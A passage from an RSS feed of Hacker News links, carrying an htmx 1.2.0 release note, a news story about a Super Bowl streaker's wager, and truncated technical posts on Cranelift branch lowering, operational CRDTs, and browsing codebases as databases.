            <pubDate>Sun, 14 Feb 2021 02:20:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Htmx 1.2.0 Release]]>
            </title>
            <description>
<![CDATA[
Score 116 | Comments 18 (<a href="https://news.ycombinator.com/item?id=26128229">thread link</a>) | @crbelaus
<br/>
February 13, 2021 | https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/ | <a href="https://web.archive.org/web/*/https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <h2>htmx 1.2.0 Release</h2>
<p>I'm happy to announce the <a href="https://unpkg.com/browse/htmx.org@1.2.0/">1.2.0 release</a> of htmx.</p>
<h3>New Features &amp; Major Changes</h3>
<ul>
<li><code>hx-vars</code> has been deprecated in favor of <code>hx-vals</code></li>
<li><code>hx-vals</code> now supports a <code>javascript:</code> prefix to achieve the behavior that <code>hx-vars</code> provided</li>
<li>The new <code>hx-headers</code> attribute allows you to add headers to a request via an attribute.  Like <code>hx-vals</code> it supports
JSON or javascript via the <code>javascript:</code> prefix</li>
<li><code>hx-include</code> will now include all inputs under an element, even if that element is not a form tag</li>
<li>The <a href="https://htmx.org/extensions/preload/">preload extension</a> now offers a <code>preload-images="true"</code> attribute that will aggressively load images in preloaded content</li>
<li>On requests driven by a history cache miss, the new <code>HX-History-Restore-Request</code> header is included so that the server
can differentiate between history requests and normal requests</li>
</ul>
<h3>Improvements &amp; Bug fixes</h3>
<ul>
<li>Improved handling of precedence of input values to favor the enclosing form (see <a href="https://github.com/bigskysoftware/htmx/commit/a10e43d619dc340aa324d37772c06a69a2f47ec9">here</a>)</li>
<li>Moved event filtering logic <em>after</em> <code>preventDefault</code> so filtering still allows events to be properly handled</li>
<li>No longer trigger after swap events on elements that have been removed via an <code>outerHTML</code> swap</li>
<li>Properly remove event handlers added to other elements when an element is removed from the DOM</li>
<li>Handle the <code>scroll:</code> modifier in <code>hx-swap</code> properly when an <code>outerHTML</code> swap occurs</li>
<li>Lots of docs fixes</li>
</ul>
<p>Enjoy!</p>

</div></div>]]>
            </description>
            <link>https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26128229</guid>
            <pubDate>Sat, 13 Feb 2021 23:51:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Super Bowl streaker says he bet $50k on his stunt]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26128093">thread link</a>) | @aaron695
<br/>
February 13, 2021 | https://www.businessinsider.in/sports/news/super-bowl-streaker-says-he-bet-50000-on-his-stunt-but-his-plan-is-falling-apart-because-he-couldnt-keep-his-mouth-shut/articleshow/80889749.cms | <a href="https://web.archive.org/web/*/https://www.businessinsider.in/sports/news/super-bowl-streaker-says-he-bet-50000-on-his-stunt-but-his-plan-is-falling-apart-because-he-couldnt-keep-his-mouth-shut/articleshow/80889749.cms">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="datatxt80889749read"><div data-den="denmark"><div><ul><li>Super Bowl streaker Yuri Andrade made a splash Sunday at Raymond James Stadium in Tampa, Florida.</li><li>After his streaking stunt, Andrade said he had bet $50,000 that a streaker would take the field.</li><li>Now it looks as though Andrade won't be cashing in on his bets because he keeps talking about it.</li></ul><p data-pos="3">With just over five minutes remaining in Super Bowl LV, <a target="_blank" href="https://www.insider.com/video-fan-storms-super-bowl-field-great-run-2021-2" rel="nofollow">a fan ran onto the field</a>, briefly disrupting the Tampa Bay Buccaneers' march to victory over the Kansas City Chiefs.</p><p data-pos="4">Later identified as Yuri Andrade, the fan had a pretty successful run as far as streakers go. He made it onto the field, got some photos taken of himself in a hot-pink one-piece emblazoned with the name of an adult website, and evaded security long enough to interrupt the game. He even got <a target="_blank" href="https://www.insider.com/kevin-harlan-super-bowl-streaker-be-a-man-2021-2" rel="nofollow">a fantastic call from the legendary play-by-play man Kevin Harlan</a>, who was broadcasting the game over the radio.</p><p>But after his stunt, reports began coming out that Andrade's run had been even more successful than initially thought. Andrade had not only made it onto the field but also claimed to have done so after placing a $50,000 wager that the Super Bowl would have a streaker, which would bring in $374,000 in winnings.</p><blockquote><div> <p data-pos="5">A post shared by Yuri andrade (@kingyuri)<time datetime=""></time></p></div></blockquote><p>Andrade's claim immediately raised eyebrows in the betting community. Patrick Everson of Covers said on Twitter that offshore sportsbooks likely would have had limits in place to prevent such a bet from being made.</p><blockquote data-lang="en" data-cards="" data-conversation="">—Patrick Everson  (@Covers_Vegas) <a target="_blank" href="https://twitter.com/mims/statuses/1358976651061653505?ref_src=twsrc%5Etfw" rel="nofollow">February 9, 2021</a></blockquote><p data-pos="9">Todd Fuhrman of the "Bet the Board" podcast also had questions about Andrade's wager, as he had initially told TMZ Sports that he sent someone to Las Vegas to make the wager. Since placing bets on off-field events isn't allowed at Vegas sportsbooks, the story immediately seemed phony.</p><blockquote data-lang="en" data-cards="" data-conversation="">—Todd Fuhrman  (@ToddFuhrman) <a target="_blank" href="https://twitter.com/mims/statuses/1359373081475620865?ref_src=twsrc%5Etfw" rel="nofollow">February 10, 2021</a></blockquote><p>But despite initial suspicions, it appears that there was some truth to Andrade's claim, though he still won't be cashing in on his run.</p><p><span>Advertisement</span></p><figure><div></div></figure><hr><p data-pos="12">Andrade <a target="_blank" href="https://theathletic.com/2378461/2021/02/11/super-bowl-streakers-motives-latest-arrest-follows-a-long-history-of-problems/" rel="nofollow">told a Tampa radio station</a> that he had gotten friends to place wagers from different accounts on the gambling site Bovada. They bet that there would be a fan on the field at +750 odds. With several smaller wagers rather than one big $50,000, it's more conceivable that Andrade could have gotten a healthy wager down on his run.</p><p>According to a report <a target="_blank" href="https://frontofficesports.com/offshore-sportsbook-voids-bets-linked-to-super-bowl-streaker/" rel="nofollow">from A.J. Perez at Front Office Sports</a>, Bovada was working to identify accounts that knew of Andrade's planned stunt."Our players have always trusted us to ensure the integrity of all props offered in our sportsbook," a Bovada spokesman told Perez. "We will continue to make sure that any publicity stunts or ill-intended behavior cannot adversely affect the outcome of a player's wager."</p><p data-pos="15">According to Perez, Bovada is refunding those that wagered there would not be a fan on the field during the game and paying out winning bets for accounts that were not linked to early knowledge of Andrade's plan. Perez wrote that one bettor who said he had no prior knowledge of the stunt had already had his account shut down by Bovada.</p><p data-pos="16">Ultimately, it looks as though Andrade's plan to bet on himself won't end up in the big payday that he had hoped for, but it appears he came closer to success than many initially suspected.</p></div></div></div></div></div>]]>
            </description>
            <link>https://www.businessinsider.in/sports/news/super-bowl-streaker-says-he-bet-50000-on-his-stunt-but-his-plan-is-falling-apart-because-he-couldnt-keep-his-mouth-shut/articleshow/80889749.cms</link>
            <guid isPermaLink="false">hacker-news-small-sites-26128093</guid>
            <pubDate>Sat, 13 Feb 2021 23:33:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cranelift, Part 2: Compiler Efficiency, CFGs, and a Branch Peephole Optimizer]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127665">thread link</a>) | @PoignardAzur
<br/>
February 13, 2021 | https://cfallin.org/blog/2021/01/22/cranelift-isel-2/ | <a href="https://web.archive.org/web/*/https://cfallin.org/blog/2021/01/22/cranelift-isel-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>This post is the second in a three-part series about
<a href="https://github.com/bytecodealliance/wasmtime/tree/main/cranelift">Cranelift</a>.
In the <a href="https://cfallin.org/blog/2020/09/18/cranelift-isel-1/">first post</a>, I
described the context around Cranelift and our project to replace its
backend code-generation infrastructure, and detailed the
instruction-selection problem and how we solve it. The remaining two
posts will be deep-dives into some interesting engineering problems.</p>

<p>In this post, I want to dive into the <em>compiler performance</em> aspect of
our work more deeply. (In the next post we’ll explore correctness.)
There are many interesting aspects of compilation speed I could talk
about, but one particularly difficult problem is the handling of
<em>control flow</em>: how do we translate structured control flow at the
Wasm level into control-flow graphs at the IR level, and finally to
branches in a linear stream of instructions at the machine-code level?</p>

<p>Doing this translation efficiently requires careful attention to the
overall pass structure, with the largest wins coming when one can
completely eliminate a category of work. We’ll see this in how we
combine several passes in a traditional lowering design (critical-edge
splitting, block ordering, redundant-block elimination, branch
relaxation, branch target resolution) into <em>inline transforms</em> that
happen during other passes (lowering of the CLIF, or Cranelift IR,
into machine-specific IR; and later, binary emission).</p>

<p>This post basically describes the
<a href="https://github.com/bytecodealliance/wasmtime/blob/main/cranelift/codegen/src/machinst/buffer.rs"><code>MachBuffer</code></a>,
a “smart machine-code buffer” that knows about branches and edits them
on-the-fly as we emit them, and the
<a href="https://github.com/bytecodealliance/wasmtime/blob/main/cranelift/codegen/src/machinst/blockorder.rs"><code>BlockLoweringOrder</code></a>,
which allows us to lower code in final basic-block order, with split
critical edges inserted implicitly, by traversing a never-materialized
implicit graph. The work was done mostly in <a href="https://github.com/bytecodealliance/wasmtime/pull/1718">Cranelift PR
#1718</a>, which
resulted in a ~10% compile-time improvement and a ~25%
compile+run-time improvement on a CPU-intensive benchmark (<code>bz2</code>).</p>

<h2 id="control-flow-graphs">Control-Flow Graphs</h2>

<p>Before we discuss any of that, we need to review control-flow graphs
(CFGs)! The CFG is a fundamental data structure used in almost all
modern compilers. In brief, it represents how execution (i.e., program
control) may flow through instructions, using graph nodes to represent
linear sequences of instructions and graph edges to represent all
possible control-flow transfers at branch instructions.</p>

<p>At the end of the instruction selection process, which we learned
about in the <a href="https://cfallin.org/blog/2020/09/18/cranelift-isel-1/">previous post</a>, we have a function body lowered into VCode that consists of
<a href="https://en.wikipedia.org/wiki/Basic_block"><em>basic blocks</em></a>. A basic
block is a contiguous sequence of instructions that has no outbound
branches except at the end, and has no inbound branches except at the
beginning. In other words, it is “straight-line” code: execution
always starts at the top and proceeds to the end. An example
control-flow graph (CFG) consisting of four basic blocks is shown
below:</p>

<p><img src="https://cfallin.org/assets/2020-10-08-cfg-web.svg" alt="Figure: Control-flow graph with four basic blocks in a diamond"></p>

<p>Control-flow graphs are excellent data structures for compilers to
use. By making the flow of execution explicit as graph edges, rather
than reasoning about instructions in order in memory as the processor
sees them, many analyses can be performed more easily. For example,
<a href="https://en.wikipedia.org/wiki/Data-flow_analysis">dataflow analysis</a>
problems can be solved easily because the CFG makes traversal of
possible control-flow transfers easy. Graph-based representations of
the program also allow easier <em>moving and insertion of code</em>: it is
less error-prone to manipulate an explicit graph than to reason about
implicit control-flow (e.g. fallthrough from a not-taken conditional
branch). Finally, the graph representation factors out the question of
<em>block ordering</em>, which can be important for performance; we can
address this problem separately by choosing how we serialize the graph
nodes (blocks). For these reasons, most compiler IRs, including
Cranelift’s CLIF and <code>VCode</code>, are CFG-based.</p>

<p>(Historical note: control-flow graphs were invented by the late
<a href="https://en.wikipedia.org/wiki/Frances_Allen">Frances Allen</a>, who
largely established the algorithmic foundations that modern compilers
use. Her paper <a href="https://www.clear.rice.edu/comp512/Lectures/Papers/1971-allen-catalog.pdf">A catalogue of optimizing
transformations</a><sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>
covers essentially all of the important optimizations used today and
is well worth a read.)</p>

<h2 id="cpus-and-branch-instructions">CPUs and Branch Instructions</h2>

<p>To represent a CFG’s end-of-block branches at the instruction level,
we can use <em>two-way branches</em>: these are instructions that branch
either to one basic-block target if some condition is true, or another
if the condition is false. (Basic blocks can also end in simple
unconditional single-target branches.) We wrote such a branch as <code>if
r0, L1, L2</code> above; this means that the block <code>L0</code> will be followed in
execution either by <code>L1</code> or <code>L2</code>, depending on the value in <code>r0</code>.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></p>

<h3 id="branches-with-fallthrough">Branches with Fallthrough</h3>

<p>However, CPUs rarely have such two-way branch instructions. Instead,
conditional control-flow in common ISAs is almost always provided with
a <em>conditional branch with fallthrough</em>. This is an instruction that,
if some condition is true, branches to another location; otherwise,
does nothing, and allows execution to continue sequentially. This is a
better fit for a hardware implementation for a number of reasons: it’s
easier to encode one target than two (the destination of the jump
might be quite far away for some branches, and instructions have
limited bits available), and it’s usually the case that the compiler
can place one of the successor blocks immediately afterward anyway.</p>

<p>Now, this isn’t much of a problem if we just want a working compiler;
instead of a two-way branch</p>



<p>We can write a sequence of branches</p>



<p>where <code>br_if</code> branches to <code>L1</code> or falls through to the unconditional
<code>goto</code>. But this is not so efficient in many cases. Consider what
would happen if we laid out basic blocks in the order <code>L0</code>, <code>L2</code>,
<code>L1</code>, <code>L3</code>:</p>

<div><div><pre><code>    L0:
      ...
      br_if r0, L1
      goto L2
    L2:
      ...
      goto L3
    L1:
      ...
      goto L3
    L3:
      ...
      return
</code></pre></div></div>

<p>There are two redundant unconditional branches (<code>goto</code> instructions),
each of which uselessly branches to the following instruction. We can
remove both of them with no ill effects, taking advantage instead of
<em>fallthrough</em>, or allowing execution to proceed directly from the end
of one block to the start of the next one:</p>

<div><div><pre><code>    L0:
      ...
      br_if r0, L1
      // ** Otherwise, fall through to L2 **
    L2:
      ...
      goto L3
    L1:
      ...
      // ** Always fall through to L3 **
    L3:
      ...
      return
</code></pre></div></div>

<p>This seems like an easy enough problem to solve: we just need to
recognize when a branch is redundant and remove it, right? Well, yes,
but we can do much better than that in some cases; we’ll dig into this
problem in significantly more depth below!</p>

<h3 id="machine-code-encoding-branch-offsets">Machine-code Encoding: Branch Offsets</h3>

<p>So far, we’ve written our machine instructions in a way that humans
can read, using <em>labels</em> to refer to locations in the instruction
stream. At the hardware level, however, these labels do not exist;
instead, the machine code branches contain target <em>addresses</em> (usually
encoded as relative <em>offsets</em> from the branch instruction). In other
words, we do not see <code>goto L3</code>, but rather <code>goto +32</code>.</p>

<p>This gives rise to several complications when emitting machine code
from a list of instruction <code>struct</code>s.  At the most basic level, we
have to resolve labels to offsets and then patch the branches
appropriately. This is analogous to (but at a lower level than) the
job of a <a href="https://en.wikipedia.org/wiki/Linker_(computing)">linker</a>:
we resolve symbols to concrete values after deciding placement, and
then edit the code according to <em>relocations</em> to refer to those
symbols. In other words, whenever we emit a branch, we make a note (a
relocation, or “label use” in our <code>MachBackend</code>) to go back later and
patch it with the resolved label offset.</p>

<p>The second, and more interesting, problem arises because not all
branch instructions can necessarily refer to all possible labels! As a
concrete example, on AArch64, conditional branches have a ±1 MB range,
and unconditional branches have a ±128 MB range. This arises out of
instruction-encoding considerations: particularly in
fixed-instruction-size ISAs (such as ARM, MIPS, and RISC V), less than
a full machine word of bits are available for the immediate jump
offset that is embedded in the instruction word. (The instruction
itself is always a machine-word wide, and we need some bits for the
opcode and condition code too!) On x86, we have limits for a different
reason: the variable-width encoding allows either a one-byte offset
(allowing a ±128 byte range) or four-byte offset (allowing a ±2 GB
range).</p>

<p>To make a branch to a far-off label, then, on some machines we need to
either use a different sort of branch than the default choice for the
instruction selector, or we need to use a form of <em>indirection</em>, by
targetting the original branch to <em>another branch</em>, the latter in a
special form. The former is tricky because we do not know whether a
target will be in-range until all code is lowered and placement is
computed; so we need to either optimistically or pessimistically lower
branches to the shortest or longest form (respectively) and possibly
switch later. To make matters worse, as we edit branches to use a
shorter or longer form, their length may change, moving <em>other</em>
targets into or out of range; in the most general solution, this is a
“fixpoint problem”, where we iterate until no more changes occur.</p>

<h2 id="challenges-in-lowering-cfgs-to-machine-code">Challenges in Lowering CFGs to Machine Code</h2>

<p>So far, we have a way to produce <em>correct</em> machine code. To emit the
final code for a two-target branch, we can emit a conditional-
followed by unconditional-branch machine instruction. To resolve
branch targets correctly, we can assume that any target could be
anywhere in memory, and always use the long form of a branch; then we
just need to come back in one final pass and fill in the offsets when
we know them.</p>

<p>We can do much better than this, though! Below I’ll describe four
problems and the ways that they are traditionally solved.</p>

<h3 id="problem-1-efficient-use-of-fallthroughs">Problem 1: Efficient use of Fallthroughs</h3>

<p>We described above how <em>branch fallthroughs</em> allow us to omit some
some unconditional branches once we know for sure the order that basic
blocks will appear in the final binary. In …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cfallin.org/blog/2021/01/22/cranelift-isel-2/">https://cfallin.org/blog/2021/01/22/cranelift-isel-2/</a></em></p>]]>
            </description>
            <link>https://cfallin.org/blog/2021/01/22/cranelift-isel-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127665</guid>
            <pubDate>Sat, 13 Feb 2021 22:37:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Laced with History: Causal Trees and Operational CRDTs (2018)]]>
            </title>
            <description>
<![CDATA[
Score 72 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26127570">thread link</a>) | @mcovalt
<br/>
February 13, 2021 | http://archagon.net/blog/2018/03/24/data-laced-with-history/ | <a href="https://web.archive.org/web/*/http://archagon.net/blog/2018/03/24/data-laced-with-history/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div id="sel_blog20180324data-laced-with-history">
<div>



<article>


<p><img src="http://archagon.net/images/blog/causal-trees/header.jpg"></p>

<p>Hello! This article took a while to cobble together. If you find it useful, please consider leaving a donation via <a href="https://donorbox.org/crdt-article"> </a>, <a href="https://www.buymeacoffee.com/archagon"> </a>, or <a href="ethereum:0x0d5dd8a8Cca8Bf7d0122F7A1Cc76c6b0666fCC56"> </a>. (Thought I'd try something new!) Or, just buy yourself a nice Roost through my <a href="http://amzn.to/2D7uYxz"> </a>. Donation or not, thank you for reading! 😊</p>

<p>(Sorry about the length! At some point in the distant past, this was supposed to be a short blog post. If you like, you can skip straight to the <a href="#demo-concurrent-editing-in-macos-and-ios">demo section</a> to get a sense of what this article is about.)</p>

<p>Embarrassingly, most of my app development to date has been confined to local devices. Programmers like to gloat about the stupendous mental castles they build of their circuitous, multi-level architectures, but not me. In truth, networks leave me quite perplexed. I start thinking about data serializing to bits, servers performing their arcane handshakes and voting rituals, merge conflicts pushing into app-space and starting the whole process over again—and it all just turns to mush in my head. For peace of mind, my code needs to be <em>locally provable</em>, and this means things like idempotent functions, decoupled modules, contiguous data structures, immutable objects. Networks, unfortunately, throw a giant wrench in the works.</p>

<p>Sometime last year, after realizing that most of my document-based apps would probably need to support sync and collaboration in the future, I decided to finally take a stab at the problem. Granted, there were tons of frameworks that promised to do the hard work of data model replication for me, but I didn’t want to black-box the most important part of my code. My gut told me that there had to be some arcane bit of foundational knowledge that would allow me to sync my documents in a refined and functional way, decoupled from the stateful spaghetti of the underlying network layer. Instead of downloading a Github framework and <a href="http://amzn.to/2iigBOI">smacking the build button</a>, I wanted to develop a base set of skills that would allow me to easily network <em>any</em> document-based app in the future, even if I was starting from scratch.</p>

<!--more-->

<p>The first order of business was to devise a wishlist for my fantastical system:</p>

<ul>
  <li>Most obviously, users should be able to edit their documents immediately, without even touching the network. (In other words, the system should only require <em>optimistic concurrency</em>.)</li>
  <li>Sync should happen in the background, entirely separate from the main application code, and any remote changes should be seamlessly integrated in real-time. (The user shouldn’t have to notice that the network is down.)</li>
  <li>Merge should always be automatic, even for concurrent edits. The user should never be faced with a “pick the correct revision” dialog box.</li>
  <li>A user should be able to work on their document offline for an indefinite period of time without accruing “sync debt”. (Meaning that if, for example, sync is accomplished by sending out mutation events, performance should not suffer even if the user spends a month offline and then sends all their hundreds of changes at once.)</li>
  <li>Secondary data structures and state should be minimized. Most of the extra information required for sync should be stored in the same place as the document, and moving the document to a new device should not break sync. (No out-of-band metadata or caches!)</li>
  <li>Network back-and-forth should be condensed to a bare minimum, and rollbacks and re-syncs should practically never happen. To the greatest possible degree, network communication should be stateless and dumb.</li>
  <li>To top it all off, my chosen technique had to pass the “PhD Test”. That is to say, one shouldn’t need a PhD to understand and implement the chosen approach for custom data models!</li>
</ul>

<p>After mulling over my bullet points, it occurred to me that the network problems I was dealing with—background cloud sync, editing across multiple devices, real-time collaboration, offline support, and reconciliation of distant or conflicting revisions—were all pointing to the same question: was it possible to design a system where any two revisions of the same document could be merged deterministically and sensibly without requiring user intervention? Sync, per se, wasn’t the issue, since getting data from one device to another was essentially a solved problem. It’s what happened <em>after</em> sync that was troubling. On encountering a merge conflict, you’d be thrown into a busy conversation between the network, model, persistence, and UI layers just to get back into a consistent state. The data couldn’t be left alone to live its peaceful, functional life: every concurrent edit immediately became a cross-architectural matter. On the other hand, if two documents could always be made to merge, then most of that coordination hullabaloo could go out the window. Each part of the system could be made to work at its own pace.</p>

<p>Whether stored as a record in a database or as a stand-alone file, a document could be interpreted as a collection of basic data fields: registers, sequences, dictionaries, and so forth. Looking at the problem from a database perspective, it was actually quite simple to automatically resolve merge conflicts in this kind of table row: just keep overwriting each field with the version sporting the highest timestamp, <a href="https://en.wikipedia.org/wiki/Lamport_timestamps">logical</a> or otherwise. (Ignoring issues of inter-field consistency for now.) Of course, for anything other than basic registers, this was a terrible approach. Sequences and dictionaries weren’t just blobs of homogeneous data that were overwritten with every change, but complex, mutable structures that users were editing on a granular level. For such a fundamental problem, there was a surprising dearth of solutions out in the real world: most systems punted the task to app-space by asking the client to manually fix any merge conflicts or pick the correct version of a file. It seemed that if the problem of automatic merge for non-trivial data types could be solved—perhaps by exposing their local, type-specific mutation vocabulary to the storage and replication layers?—then a solution to the higher-level problem of automatic document merge would fall within reach.</p>

<p>In hope of uncovering some prior art, I started by looking at the proven leader in the field, Google Docs. Venturing down the deep rabbit hole of <a href="https://en.wikipedia.org/wiki/Collaborative_real-time_editor">real-time collaborative editing</a> techniques, I discovered that many of the problems I faced fell under the umbrella of <a href="https://en.wikipedia.org/wiki/Eventual_consistency">strong eventual consistency</a>. Unlike the more conventional <a href="https://en.wikipedia.org/wiki/Strong_consistency">strong consistency</a> model, where all clients receive changes in identical order and rely on locking to some degree, strong <em>eventual</em> consistency allows clients to individually diverge and then arrive at a final, consistent result once each update has been received. (Or, in a word, when the network is <em>quiescent</em>.)</p>

<p>There were a number of tantalizing techniques to investigate, and I kept several questions in mind while doing my analysis. Could a given technique be generalized to arbitrary and novel data types? Did the technique pass the PhD Test? And was it possible to use the technique in an architecture with smart clients and dumb servers?</p>

<p>The reason for that last question was CloudKit Sharing, a framework introduced in iOS 10. For the most part, this framework functioned as a superset of regular CloudKit, requiring only minor code changes to enable document sharing in an app. A developer didn’t even have to worry about connecting users or dealing with UI: Apple did most of the hard work in the background while leveraging standard system dialogs. But almost two years later, <a href="https://github.com/search?l=Swift&amp;q=UICloudSharingController&amp;type=Code&amp;utf8=%E2%9C%93">on the order of no one</a> seemed to be using it. Why was this? Most other Apple APIs tended to be readily adopted, especially when they allowed the developer to expand into system areas which were normally out of bounds.</p>

<p>My hunch was that CloudKit Sharing forced the issue of real-time collaboration over a relatively dumb channel, which was a task outside the purview of conventional sync approaches. CloudKit allowed developers to easily store, retrieve, and listen for new data, but not much else besides. No third-party code was allowed to run on Apple’s servers, so merge conflicts had to be handled locally. But unlike in the single-user case, which presented limited opportunities for concurrent edits, you couldn’t just pop up a merge dialog every time another participant in your share made a change to your open document. The only remaining options seemed to be some sort of ugly, heuristic auto-merge or data-dropping last-write-wins, neither of which was acceptable for real-time use. Collaboration along the lines of Google Docs appeared to be impossible using this system! But was it really?</p>

<p>I realized that this was my prize to be won. If I could figure out a way to develop auto-merging documents, I’d be able to implement sync and collaboration in my apps over CloudKit while using Apple’s first-party sharing UI—all without having to pay for or manage my own servers. So this became my ultimate research goal: a collaborative iPhone text editing demo that synced entirely over CloudKit. (And here’s a spoiler: <a href="#demo-concurrent-editing-in-macos-and-ios">it worked!</a>)</p>





<p>There are a few basic terms critical to understanding eventual consistency. A network is comprised of <em>sites</em> (“devices”, “peers”) operating in parallel, each one producing <em>operations</em> (“events”, “actions”) that mutate the data and exchange information with other sites. The first vital concept here is <strong>causality</strong>. An operation is <em>caused</em> by another operation when it directly modifies or otherwise involves the results of that operation, and determining causality is critical to reconstructing a sensible timeline (or <strong>linearization</strong>) of operations across the network. (An operation that <em>causes</em> another operation must always be ordered first.) However, we can’t always determine direct causality in a general way, so algorithms often assume that an operation is causally ahead of another one if the site generating the newer operation has already seen the older one at the time of its creation. (In other words, every operation already seen by a site at the time a new operation is created is in that operation’s <em>caus…</em></p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://archagon.net/blog/2018/03/24/data-laced-with-history/">http://archagon.net/blog/2018/03/24/data-laced-with-history/</a></em></p>]]>
            </description>
            <link>http://archagon.net/blog/2018/03/24/data-laced-with-history/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127570</guid>
            <pubDate>Sat, 13 Feb 2021 22:25:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Database Inside Your Codebase]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127428">thread link</a>) | @todsacerdoti
<br/>
February 13, 2021 | https://feifan.blog/posts/the-database-inside-your-codebase | <a href="https://web.archive.org/web/*/https://feifan.blog/posts/the-database-inside-your-codebase">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
<div>
  <article>
    
      <p><img src="https://files.tanagram.app/file/tanagram-data/prod-feifans-blog/joshua-sortino-LqKhnDzSF-8-unsplash.jpg">
      </p>
<p>
Navigating codebases of any meaningful size is difficult. Most of a programmer’s time is spent jumping through the codebase, reading or skimming to build a mental model of the constructs and conventions within it. These constructs — among them: the DSLs, interfaces, and taxonomy of types that exist — are arguably the most important precursor to understanding where and how to make changes. But these constructs only exist in programmers’ heads. It’s difficult or impossible to navigate most codebases through the lens of those constructs; programmers lack “code browsers” that present the underlying code independently of files and the filesystem hierarchy. Yet code browsers that can do so — and we’ll look at some examples below — would be incredibly useful. This is because instances of these constructs can be thought of as records in a database, albeit an ad-hoc, poorly-specified database that can only be queried through carefully-crafted regexes<a href="#fn:1" id="fnref:1" title="see footnote">1</a>.</p>
<p>
In simple cases, some constructs manifest as naming conventions: prefixes in a name may be a rudimentary way to namespace classes<a href="#fn:2" id="fnref:2" title="see footnote">2</a>, while suffixes may be a rudimentary way to group classes or identify their type<a href="#fn:3" id="fnref:3" title="see footnote">3</a>. But these are easy examples; many patterns are much more subtle.</p>
<h2>
“Where is this used?”</h2>
<p>
Imagine figuring out “where is this used?”, for various types of “this”:</p>
<p>
Most code editors (perhaps paired with a <a href="https://microsoft.github.io/language-server-protocol/">language server</a>) can show you where local variables are used. This usually also works for finding where methods are invoked — although perhaps less reliably in dynamic-dispatch languages, or languages without types.</p>
<p>
What if you want to find where instances of a particular model get created? There may be multiple ways to create a model, so this isn’t super simple. In Rails, for example, there’s two built-in ways to create a model: you can either call <code>.new</code> to create a new instance in memory followed by <code>.save</code> to persist it to the database, or call <code>.create</code> to automatically do both. Your particular codebase might have additional wrappers for doing this that you’re supposed to use. Even worse, imagine that sometimes you create a <code>.new</code> instance, then set some properties on it over the next few lines, then finally call <code>.save</code>. Something like this:</p>
<pre><code>user = User.new
user.email = '<a href="https://feifan.blog/cdn-cgi/l/email-protection" data-cfemail="bcd4d9d0d0d3fcd9c4ddd1ccd0d992dfd3d1">[email&nbsp;protected]</a>' unless self.anonymous?
user.save</code></pre>
<p>
Conceptually, that’s still code that creates an instance of a particular model. But with the intervening syntax, this would be a difficult case to find with <code>grep</code>.</p>
<h2>
Static config</h2>
<p>
At <a href="https://stripe.com/">Stripe</a>, where I work, we have a lot of code for jobs that need to run at certain times each day. For example, we might need to move funds from one financial partner to another at noon UTC each day. Each of these jobs has configuration code describing when and how it should be run, implemented as a <a href="https://www.jetbrains.com/mps/concepts/domain-specific-languages/">DSL</a>. This config might look something like this:</p>
<pre><code>run_config RunConfig.new(
  job_name: 'partner-daily-funding',
  env_vars: self.config_env,
  cron: RunConfig::Cron.new(
    schedule: { hour: 12, minute: 0 }
  ),
  owning_team: Company::Team::Liquidity
)</code></pre>
<p>
In our codebase, we have hundreds of these jobs, each with their own <code>run_config</code>. If you look at this codebase as a database, you can imagine these jobs being rows in a <code>jobs</code> table, where the fields on each row correspond to the parameters provided to the <code>RunConfig</code> class. </p>
<p>
Wouldn’t it be great to be able to browse all these jobs in a table? Maybe you could perform some basic operations on this data: searching for specific jobs by name or owning team; sorting by the time-of-day they’re scheduled to run; filtering for jobs owned by your team that have errored in the past week. Maybe you could edit the <code>run_config</code> from that interface (like you might edit a spreadsheet) and have it automatically make the corresponding change in the source code (or open a PR). Maybe you could even compute some aggregations on this data — for example, if you’re introducing a new job that requires some expensive computation, maybe you’d like to know which hours have the fewest other jobs scheduled. And of course, this job browser should be bidirectional with respect to the codebase — there should be a button beside each entry that shows the code for the job inline or opens the corresponding code in your editor.</p>
<h2>
Diffused concepts</h2>
<p>
Codebases typically contain logical concepts that are implemented across multiple pieces of code. This is often the case when you need to create multiple files to implement a particular feature.</p>
<p>
For example, in Rails, a “resource” is collectively implemented across a line in the router, a model file, a controller file, and a bunch of view files. Rails even ships with a code generator to <a href="https://github.com/rails/rails/blob/5f3ff60084ab5d5921ca3499814e4697f8350ee7/railties/lib/rails/generators/rails/resource/USAGE">create some of these files</a> for you. But despite resources being a core concept when working with Rails, there’s no good way to browse the resources in your codebase<a href="#fn:4" id="fnref:4" title="see footnote">4</a>. There’s no good way to filter or query your codebase either — you can’t, for example, see which resources support JSON vs XML params. </p>
<p>
